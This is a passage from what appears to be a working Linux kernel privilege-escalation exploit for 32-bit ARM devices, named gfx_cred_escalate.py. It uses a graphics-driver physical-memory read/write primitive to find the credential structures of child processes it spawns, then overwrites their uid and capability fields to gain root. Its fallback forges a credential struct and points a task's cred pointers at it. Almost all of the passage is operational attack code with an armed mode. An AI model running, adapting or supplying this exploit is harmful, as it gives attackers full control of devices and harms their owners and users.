    # template: clone a reachable cred found during calibration (no extra scan).
    # The whole struct is cloned so no real pointer field (keyrings, user_ns,
    # security) is truncated to a NULL the kernel might dereference.
    tmpl = gfx_peek(P.tpl_uidfp - P.uid_off, 0x100) if P.tpl_uidfp else None
    if not tmpl or len(tmpl) != 0x100:
        log("FALLBACK: no template cred available"); return 3
    forged_virt, keep = place_forged_cred(tmpl)
    if forged_virt is None:
        log("FALLBACK: could not place a forged cred in a reachable page"); return 3
    log("forged cred at virt 0x%x (phys 0x%x)" % (forged_virt, phys_of(forged_virt)))
    ptr = struct.pack('<Q', forged_virt) * 2
    if not gfx_write(comm_phys - P.cred_gap - 8, ptr):    # real_cred then cred
        log("FALLBACK: task-struct write refused"); return 6
    thrash(); send(kids[idx], b"R")
    return keep, idx

# ---- main ----

def main():
    args = sys.argv[1:]
    if args not in ([], ["go"], ["go", "redirect"]):
        log("usage: gfx_cred_escalate.py [go [redirect]]")
        return 2
    if not sys.platform.startswith("linux") or ctypes.sizeof(ctypes.c_void_p) != 4:
        log("requires 32-bit Linux userspace with the ARM mmap2 ABI")
        return 2
    go = bool(args)
    redirect_ok = args == ["go", "redirect"]

    P.base, P.carveout_end = parse_mem_stat()
    if not P.base:
        log("could not read BASE from procfs; aborting"); return 1
    P.ram_top = find_ram_top(P.carveout_end)
    P.cap_full = read_cap_mask()
    global SKIP_RANGES
    SKIP_RANGES = detect_mmio_skip_ranges(P.carveout_end, P.ram_top)
    log("BASE=0x%x  carveout_end=0x%x  ram_top=0x%x  uid=%d gid=%d  mode=%s"
        % (P.base, P.carveout_end, P.ram_top, P.myuid, P.mygid, "ARMED" if go else "DRY-RUN"))
    if gfx_read(P.carveout_end, 16) is None:
        log("primitive check FAILED: cannot map reachable RAM via %s" % GFX); return 1

    prefix = "Gx%06x_" % random.randint(0, 0xffffff)
    K = 384
    tags = [prefix + "%03d" % i for i in range(K)]
    kids = spawn_children(tags)
    log("spawned %d quiescent children, comm prefix %r" % (K, prefix))
    try:
        return run_with_children(kids, prefix, tags, go, redirect_ok)
    finally:
        stand_down(kids)
        reap(kids)

def run_with_children(kids, prefix, tags, go, redirect_ok):
    if not calibrate(prefix, tags):
        log("calibration failed: no reachable (task, cred) pair to anchor PAGE_OFFSET. "
            "raise K or apply low-memory pressure.")
        stand_down(kids); reap(kids); return 3

    reach, unreach = classify(prefix, tags)
    log("located %d children reachable  (cred >=BASE: %d, cred <BASE: %d)"
        % (len(reach) + len(unreach), len(reach), len(unreach)))

    if reach:
        for try_n, (idx, (cred_phys, comm_phys)) in enumerate(sorted(reach.items())[:8], 1):
            log("TARGET try %d: child idx=%d cred@phys 0x%x" % (try_n, idx, cred_phys))
            if not primary_target_valid(cred_phys, comm_phys, tags[idx]):
                log("target failed identity check; next"); continue
            if not go:
                log("dry run: calibration complete, target found. no write done.")
                stand_down(kids); reap(kids); return 0
            send(kids[idx], b"P" + struct.pack('<QHH', cred_phys, P.uid_off, P.cap_off))
            try:
                res = read_result(kids[idx])
            except RuntimeError as e:
                log("child %d: TIMEOUT: %s" % (idx, str(e)[:180])); continue
            log("child %d: %s" % (idx, res.strip()))
            if "ROOT" in res:
                stand_down(kids, keep=kids[idx]); reap(kids); return 0
        log("primarios agotados - cayendo al fallback redirect")

    if not unreach:
        log("no children located; raise K or apply memory pressure.")
        stand_down(kids); reap(kids); return 3
    if not redirect_ok:
        log("no child has a reachable cred. fallback is opt-in: re-run with 'go redirect'.")
        do_redirect(kids, unreach, go=False); stand_down(kids); reap(kids); return 2

    out = do_redirect(kids, unreach, go=True)
    if not isinstance(out, tuple):
        stand_down(kids); reap(kids); return out or 3
    keep, idx = out
    stand_down(kids, keep=kids[idx])
    res = read_result(kids[idx]); log("child %d: %s" % (idx, res.strip()))
    reap(kids); return 0 if res.startswith("ROOT") else 7

if __name__ == "__main__":
    sys.exit(main())
